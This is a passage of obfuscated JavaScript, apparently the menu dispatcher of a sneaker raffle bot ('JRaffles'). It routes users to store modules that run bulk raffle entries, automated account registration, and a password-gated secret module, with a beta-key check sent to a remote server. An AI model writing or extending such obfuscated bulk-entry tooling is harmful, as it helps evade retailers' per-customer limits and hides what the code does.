                        console['log']('\x20(' + _0x2737be + ')\x20[' + _0x372ea7[_0x2737be]['name'] + ']');
                        continue;
                    }
                    if (_0x372ea7[_0x2737be]['name'] === 'Reload\x20Settings' || _0x372ea7[_0x2737be]['name'] === 'Change\x20Settings')
                        continue;
                    else
                        console['log']('\x20(' + _0x2737be + ')\x20\x20[' + _0x372ea7[_0x2737be]['name'] + ']');
                }
                ;
                console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('\x20(' + (_0x372ea7['length'] - 0x4) + ')\x20Failed\x20Tasks'), console['log']('\x20(' + (_0x372ea7['length'] - 0x3) + ')\x20Paypal\x20Verification'), console['log']('\x20(' + (_0x372ea7['length'] - 0x2) + ')\x20Change\x20Settings'), console['log']('\x20(' + (_0x372ea7['length'] - 0x1) + ')\x20Reload\x20Settings'), console['log'](''), taskModule = await _0xae690();
                if (taskModule > _0x372ea7['length'] - 0x1 || isNaN(taskModule) == !![])
                    return console['log']('Invalid\x20selection'), await _0x41ed31(0x3e8), _0x118029();
                if (_0x372ea7[taskModule]['name'] == 'BSTN') {
                    taskFunction = await _0xfe4705(_0x372ea7[taskModule]['modules']);
                    var _0x49328b = _0x372ea7[taskModule]['modules'][taskFunction];
                    console['clear']();
                    try {
                        if (taskFunction == 0x3) {
                            var _0x5c416e = await _0x1ee84e();
                            await _0x49328b['function'](_0x49328b, _0x5c416e);
                        }
                        if (taskFunction == 0x2) {
                            var _0x5c416e = await _0x1ee84e(), _0x1bb3eb = await _0x55c71b(_0x49328b);
                            _0x4ae33b['shuffleTasks'] && await _0xcd4291(_0x1bb3eb), await _0x49328b['function'](_0x49328b, _0x1bb3eb, _0x5c416e);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x5c416e = await _0x1ee84e(), _0x1bb3eb = await _0x55c71b(_0x49328b);
                                _0x4ae33b['shuffleTasks'] && await _0xcd4291(_0x1bb3eb), await _0x49328b['function'](_0x49328b, _0x1bb3eb, _0x5c416e);
                            } else {
                                if (taskFunction == 0x1) {
                                    var _0x5c416e = await _0x1ee84e();
                                    await _0x49328b['function'](_0x49328b, _0x5c416e);
                                }
                            }
                        }
                    } catch (_0x37ff73) {
                        console['log'](_0x37ff73), await _0x41ed31(0x7d0);
                    }
                    return _0x118029();
                }
                if (_0x372ea7[taskModule]['name'] == 'FENOM') {
                    try {
                        taskFunction = await _0xfe4705(_0x372ea7[taskModule]['modules']);
                        var _0x49328b = _0x372ea7[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x1) {
                            var _0x5c416e = await _0x1ee84e(), _0x2d5e01 = await _0x55c71b(_0x49328b);
                            _0x4ae33b['shuffleTasks'] && await _0xcd4291(_0x2d5e01), await _0x49328b['function'](_0x49328b, _0x2d5e01, _0x5c416e);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x5c416e = await _0x1ee84e(), _0x2d5e01 = await _0x55c71b(_0x49328b);
                                _0x4ae33b['shuffleTasks'] && await _0xcd4291(_0x2d5e01), await _0x49328b['function'](_0x49328b, _0x2d5e01, _0x5c416e);
                            }
                        }
                    } catch (_0x1bc793) {
                        console['log'](_0x1bc793), await _0x41ed31(0xfa0);
                    }
                    return _0x118029();
                }
                if (_0x372ea7[taskModule]['name'] == 'Overkill') {
                    try {
                        taskFunction = await _0xfe4705(_0x372ea7[taskModule]['modules']);
                        var _0x49328b = _0x372ea7[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x1) {
                            var _0x5c416e = await _0x1ee84e(), _0x2d5e01 = await _0x55c71b(_0x49328b);
                            _0x4ae33b['shuffleTasks'] && await _0xcd4291(_0x2d5e01), await _0x49328b['function'](_0x49328b, _0x2d5e01, _0x5c416e);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x5c416e = await _0x1ee84e(), _0x2d5e01 = await _0x55c71b(_0x49328b);
                                _0x4ae33b['shuffleTasks'] && await _0xcd4291(_0x2d5e01), await _0x49328b['function'](_0x49328b, _0x2d5e01, _0x5c416e);
                            }
                        }
                    } catch (_0x63292a) {
                        console['log'](_0x63292a), await _0x41ed31(0xfa0);
                    }
                    return _0x118029();
                }
                if (_0x372ea7[taskModule]['name'] == '4ELEMENTOS') {
                    taskFunction = await _0xfe4705(_0x372ea7[taskModule]['modules']);
                    var _0x49328b = _0x372ea7[taskModule]['modules'][taskFunction];
                    console['clear']();
                    if (taskFunction == 0x1) {
                        var _0x5c416e = await _0x1ee84e();
                        return await _0x49328b['function'](_0x49328b, _0x5c416e), _0x118029();
                    }
                    var _0x5c416e = await _0x1ee84e(), _0xb4803e = await _0x55c71b(_0x49328b);
                    return _0x4ae33b['shuffleTasks'] && await _0xcd4291(_0xb4803e), await _0x49328b['function'](_0x49328b, _0xb4803e, _0x5c416e), _0x118029();
                }
                if (_0x372ea7[taskModule]['name'] == 'OneBlockDown') {
                    taskFunction = await _0xfe4705(_0x372ea7[taskModule]['modules']);
                    var _0x49328b = _0x372ea7[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x5c416e = await _0x1ee84e(), _0xb4803e = await _0x55c71b(_0x49328b);
                    return _0x4ae33b['shuffleTasks'] && await _0xcd4291(_0xb4803e), await _0x49328b['function'](_0x49328b, _0xb4803e, _0x5c416e), _0x118029();
                }
                if (_0x372ea7[taskModule]['name'] == 'AFEW\x20Store' || _0x372ea7[taskModule]['name']['includes']('BACKDOOR')) {
                    taskFunction = await _0xfe4705(_0x372ea7[taskModule]['modules']);
                    var _0x49328b = _0x372ea7[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x5c416e = await _0x1ee84e(), _0xb4803e = await _0x55c71b(_0x49328b);
                    return _0x4ae33b['shuffleTasks'] && await _0xcd4291(_0xb4803e), await _0x49328b['function'](_0x49328b, _0xb4803e, _0x5c416e), _0x118029();
                }
                if (_0x372ea7[taskModule]['name'] == 'EQL') {
                    taskFunction = await _0xfe4705(_0x372ea7[taskModule]['modules']);
                    var _0x49328b = _0x372ea7[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x5c416e = await _0x1ee84e(), _0xb4803e = await _0x55c71b(_0x49328b);
                    return _0x4ae33b['shuffleTasks'] && await _0xcd4291(_0xb4803e), await _0x49328b['function'](_0x49328b, _0xb4803e, _0x5c416e), _0x118029();
                } else {
                    if (_0x372ea7[taskModule]['name'] == 'MAHA\x20Amsterdam') {
                        taskFunction = await _0xfe4705(_0x372ea7[taskModule]['modules']);
                        var _0x49328b = _0x372ea7[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x0) {
                            var _0x5c416e = await _0x1ee84e(), _0x3fceb4 = await _0x55c71b(_0x49328b);
                            return _0x4ae33b['shuffleTasks'] && await _0xcd4291(_0x3fceb4), await _0x49328b['function'](_0x49328b, _0x3fceb4, _0x5c416e), _0x118029();
                        } else {
                            if (taskFunction == 0x1) {
                                var _0x5c416e = await _0x1ee84e();
                                return await _0x49328b['function'](_0x49328b, null, _0x5c416e), _0x118029();
                            }
                        }
                        ;
                    } else {
                        if (_0x372ea7[taskModule]['name'] == 'FOOTSHOP') {
                            taskFunction = await _0xfe4705(_0x372ea7[taskModule]['modules']);
                            var _0x49328b = _0x372ea7[taskModule]['modules'][taskFunction], _0x5c416e = await _0x1ee84e(), _0x3bf888 = await _0x55c71b(_0x49328b);
                            return _0x4ae33b['shuffleTasks'] && await _0xcd4291(_0x3bf888), await _0x49328b['function'](_0x49328b, _0x3bf888, _0x5c416e), await _0x41ed31(0x1388), _0x118029();
                        } else {
                            if (_0x372ea7[taskModule]['name'] == 'Google\x20Forms') {
                                try {
                                    let _0x8a7b76 = { 'headers': { 'content-type': 'application/json' } }, _0x5b2b3f = { 'key': _0xa9458 }, _0x5ada25 = await _0x48af5a['post']('https://jraffles.herokuapp.com/beta', _0x5b2b3f, _0x8a7b76);
                                    if (_0x5ada25['status'] != 0xc8)
                                        throw new Error('No\x20Beta\x20Access..');
                                    console['log']('Hello,\x20' + _0x3dfcf2['cyan'](_0x128b96) + '.\x20Beta\x20Access\x20Granted.'), await _0x41ed31(0x3e8);
                                } catch (_0x759828) {
                                    return console['log']('No\x20Beta\x20Access.'), await _0x41ed31(0x7d0), _0x118029();
                                }
                                taskFunction = await _0xfe4705(_0x372ea7[taskModule]['modules']);
                                var _0x49328b = _0x372ea7[taskModule]['modules'][taskFunction], _0x5c416e = await _0x1ee84e(), _0x3bf888 = await _0x55c71b(_0x49328b);
                                return _0x4ae33b['shuffleTasks'] && await _0xcd4291(_0x3bf888), await _0x49328b['function'](_0x49328b, _0x3bf888, _0x5c416e), await _0x41ed31(0x1388), _0x118029();
                            } else {
                                if (_0x372ea7[taskModule]['name'] == 'OQIUM\x20Store') {
                                    taskFunction = await _0xfe4705(_0x372ea7[taskModule]['modules']);
                                    var _0x49328b = _0x372ea7[taskModule]['modules'][taskFunction];
                                    console['clear']();
                                    if (taskFunction == 0x0) {
                                        var _0x5c416e = await _0x1ee84e(), _0x3fceb4 = await _0x55c71b(_0x49328b);
                                        return _0x4ae33b['shuffleTasks'] && await _0xcd4291(_0x3fceb4), await _0x49328b['function'](_0x49328b, _0x3fceb4, _0x5c416e), _0x118029();
                                    } else {
                                        if (taskFunction == 0x1) {
                                            var _0x5c416e = await _0x1ee84e();
                                            return await _0x49328b['function'](_0x49328b, null, _0x5c416e), _0x118029();
                                        }
                                    }
                                    ;
                                } else {
                                    if (_0x372ea7[taskModule]['name'] == 'BOUNCEWEAR') {
                                        taskFunction = await _0xfe4705(_0x372ea7[taskModule]['modules']);
                                        var _0x49328b = _0x372ea7[taskModule]['modules'][taskFunction];
                                        console['clear']();
                                        if (taskFunction == 0x0)
                                            await bwAcc('https://bouncewear.com/nl/account/register', _0x49328b);
                                        else {
                                            if (taskFunction == 0x1) {
                                            }
                                        }
                                        ;
                                    } else {
                                        if (_0x372ea7[taskModule]['name'] == 'PATTA') {
                                            taskFunction = await _0xfe4705(_0x372ea7[taskModule]['modules']);
                                            var _0x49328b = _0x372ea7[taskModule]['modules'][taskFunction];
                                            console['clear']();
                                            if (taskFunction == 0x0) {
                                                var _0x5c416e = await _0x1ee84e(), _0x35b80f = await _0x55c71b(_0x49328b);
                                                return _0x4ae33b['shuffleTasks'] && await _0xcd4291(_0x35b80f), await _0x49328b['function'](_0x49328b, _0x35b80f, _0x5c416e), _0x118029();
                                            } else {
                                                if (taskFunction == 0x1) {
                                                    var _0x5c416e = await _0x1ee84e(), _0x35b80f = await _0x55c71b(_0x49328b);
                                                    return _0x4ae33b['shuffleTasks'] && await _0xcd4291(_0x35b80f), await _0x49328b['function'](_0x49328b, _0x35b80f, _0x5c416e), _0x118029();
                                                }
                                            }
                                            ;
                                        } else {
                                            if (_0x372ea7[taskModule]['name'] == 'SLAM\x20JAM') {
                                                taskFunction = await _0xfe4705(_0x372ea7[taskModule]['modules']);
                                                var _0x49328b = _0x372ea7[taskModule]['modules'][taskFunction];
                                                console['clear']();
                                                if (taskFunction == 0x0) {
                                                    var _0x5c416e = await _0x1ee84e(), _0x3d9615 = await _0x55c71b(_0x49328b);
                                                    return _0x4ae33b['shuffleTasks'] && await _0xcd4291(_0x3d9615), await _0x49328b['function'](_0x49328b, _0x3d9615, _0x5c416e), _0x118029();
                                                } else {
                                                    if (taskFunction == 0x1) {
                                                        var _0x5c416e = await _0x1ee84e(), _0x3d9615 = await _0x55c71b(_0x49328b);
                                                        return _0x4ae33b['shuffleTasks'] && await _0xcd4291(_0x3d9615), await _0x49328b['function'](_0x49328b, _0x3d9615, _0x5c416e), _0x118029();
                                                    }
                                                }
                                                ;
                                            } else {
                                                if (_0x372ea7[taskModule]['name'] == 'KICKZ') {
                                                    taskFunction = await _0xfe4705(_0x372ea7[taskModule]['modules']);
                                                    var _0x49328b = _0x372ea7[taskModule]['modules'][taskFunction];
                                                    console['clear']();
                                                    if (taskFunction == 0x0) {
                                                        var _0x5c416e = await _0x1ee84e(), _0x528472 = await _0x55c71b(_0x49328b);
                                                        return _0x4ae33b['shuffleTasks'] && await _0xcd4291(_0x528472), await _0x49328b['function'](_0x49328b, _0x528472, _0x5c416e), _0x118029();
                                                    } else {
                                                        if (taskFunction == 0x1) {
                                                            var _0x5c416e = await _0x1ee84e(), _0x528472 = await _0x55c71b(_0x49328b);
                                                            return _0x4ae33b['shuffleTasks'] && await _0xcd4291(_0x528472), await _0x49328b['function'](_0x49328b, _0x528472, _0x5c416e), _0x118029();
                                                        }
                                                    }
                                                    ;
                                                } else {
                                                    if (_0x372ea7[taskModule]['name'] == 'KICKZ') {
                                                        taskFunction = await _0xfe4705(_0x372ea7[taskModule]['modules']);
                                                        var _0x49328b = _0x372ea7[taskModule]['modules'][taskFunction];
                                                        console['clear']();
                                                        if (taskFunction == 0x0) {
                                                            var _0x5c416e = await _0x1ee84e(), _0x528472 = await _0x55c71b(_0x49328b);
                                                            return _0x4ae33b['shuffleTasks'] && await _0xcd4291(_0x528472), await _0x49328b['function'](_0x49328b, _0x528472, _0x5c416e), _0x118029();
                                                        } else {
                                                            if (taskFunction == 0x1) {
                                                                var _0x5c416e = await _0x1ee84e(), _0x528472 = await _0x55c71b(_0x49328b);
                                                                return _0x4ae33b['shuffleTasks'] && await _0xcd4291(_0x528472), await _0x49328b['function'](_0x49328b, _0x528472, _0x5c416e), _0x118029();
                                                            }
                                                        }
                                                        ;
                                                    } else {
                                                        if (_0x372ea7[taskModule]['name'] == 'ADIDAS\x20CONFIRMED') {
                                                            taskFunction = await _0xfe4705(_0x372ea7[taskModule]['modules']);
                                                            var _0x49328b = _0x372ea7[taskModule]['modules'][taskFunction];
                                                            console['clear']();
                                                            if (taskFunction == 0x0 || taskFunction == 0x1 || taskFunction == 0x2 || taskFunction == 0x3 || taskFunction == 0x4) {
                                                                var _0x5c416e = await _0x1ee84e(), _0x110c3e = await _0x55c71b(_0x49328b);
                                                                return _0x4ae33b['shuffleTasks'] && await _0xcd4291(_0x110c3e), await _0x49328b['function'](_0x110c3e, _0x5c416e), _0x118029();
                                                            }
                                                        } else {
                                                            if (_0x372ea7[taskModule]['name'] == 'Seven\x20Store')
                                                                return console['log']('returning\x20to\x20menu'), await _0x41ed31(0x3e8), _0x118029();
                                                            else {
                                                                if (_0x372ea7[taskModule]['name'] == 'Paypal\x20Verification') {
                                                                    var _0x2ae4db = _0x372ea7[taskModule]['name'], _0x5c416e = await _0x1ee84e();
                                                                    return await _0x5d891e(_0x2ae4db, _0x5c416e), _0x118029();
                                                                } else {
                                                                    if (_0x372ea7[taskModule]['name'] == 'Failed\x20Tasks') {
                                                                        taskFunction = await _0xfe4705(_0x372ea7[taskModule]['modules']);
                                                                        var _0x49328b = _0x372ea7[taskModule]['modules'][taskFunction];
                                                                        return await _0x49328b['function'](_0x49328b), _0x118029();
                                                                    } else {
                                                                        if (_0x372ea7[taskModule]['name'] == 'Change\x20Settings') {
                                                                            console['log']('Choose\x20a\x20Setting\x20to\x20change\x20:\x0a');
                                                                            var _0x448a91 = 0x0;
                                                                            for (const _0x5d7a5f in _0x4ae33b) {
                                                                                console['log']('(' + _0x448a91 + ')\x20' + _0x5d7a5f + '\x20:\x20' + _0x4ae33b[_0x5d7a5f]), _0x448a91++;
                                                                            }
                                                                            console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('(' + _0x448a91 + ')\x20Return\x20to\x20Main\x20Menu');
                                                                            var _0x12420e = await _0x588cb3();
                                                                            if (_0x12420e == _0x448a91)
                                                                                return _0x118029();
                                                                            console['clear'];
                                                                            var _0x48612c = 0x0;
                                                                            for (var _0x3a99cb in _0x4ae33b) {
                                                                                if (_0x12420e == _0x48612c) {
                                                                                    console['log']('Changing:\x20\x0a\x20\x0a\x20' + _0x3a99cb + '\x20:'), _0x4ae33b[_0x3a99cb] = await _0x129468(), _0x223df9['writeFileSync']('../settings.json', JSON['stringify'](_0x4ae33b));
                                                                                    break;
                                                                                } else
                                                                                    _0x48612c++;
                                                                            }
                                                                            return console['log']('Settings\x20Saved!'), await _0x41ed31(0xbb8), _0x118029();
                                                                        } else {
                                                                            if (_0x372ea7[taskModule]['name'] == 'Reload\x20Settings')
                                                                                return console['log']('Reloading\x20settings'), await _0x36d5d6(), _0x118029();
                                                                            else {
                                                                                if (taskModule == 0x45) {
                                                                                    _0x372ea7[0x45] = { 'name': 'AFEW\x20SECRET' };
                                                                                    var _0x259063 = await _0x16fe62();
                                                                                    _0x259063 == 'ModuleVoorDeBoys' ? (await afewScraper(), await _0x4370d5(), await afewFunction(_0x2d93fc[_0x4ad8a1], 'sec')) : (console['log']('Wrong\x20password,\x20closing\x20in\x2010\x20seconds...'), await _0x41ed31(0xbb8));
                                                                                } else {
                                                                                }
                                                                            }
                                                                        }
                                                                    }
                                                                }
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
            try {
                await _0x118029();
            } catch (_0x2256e8) {
                return console['log'](_0x2256e8), await _0x41ed31(0x2710), _0x118029();
            }
        } catch (_0x1b2546) {
            return console['log'](_0x1b2546), await _0x41ed31(0x3a98);
        }
}
;
_0x445891('JRaffles\x20' + _0x8a26c5);
try {
    _0x36d5d6(), _0x1a5633();
} catch (_0x1f0c66) {
    console['log'](_0x1f0c66);
}